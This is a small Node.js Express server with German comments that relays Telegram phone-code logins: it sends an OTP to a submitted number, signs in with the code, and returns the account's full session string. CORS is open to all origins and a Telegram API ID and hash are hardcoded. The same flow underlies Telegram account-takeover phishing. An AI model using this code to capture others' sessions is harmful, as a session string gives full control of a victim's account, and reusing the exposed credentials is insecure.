const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const app = express();

app.use(cors());
app.use(express.json());

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const sessions = new Map(); // Speichert { phone: { client, phoneCodeHash } }

app.post('/send-otp', async (req, res) => {
    const { phone } = req.body;
    try {
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, phone);
        sessions.set(phone, { client, phoneCodeHash });
        res.json({ success: true, phoneCodeHash });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    const { phone, code, phoneCodeHash } = req.body;
    const sessionData = sessions.get(phone);
    if (!sessionData) return res.status(400).json({ error: 'Session abgelaufen' });

    try {
        await sessionData.client.signIn({
            apiId, apiHash,
            phoneNumber: phone,
            phoneCode: code,
            phoneCodeHash: phoneCodeHash
        });
        const sessionString = sessionData.client.session.save();
        res.json({ success: true, session: sessionString });
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
});

app.listen(process.env.PORT || 3000);
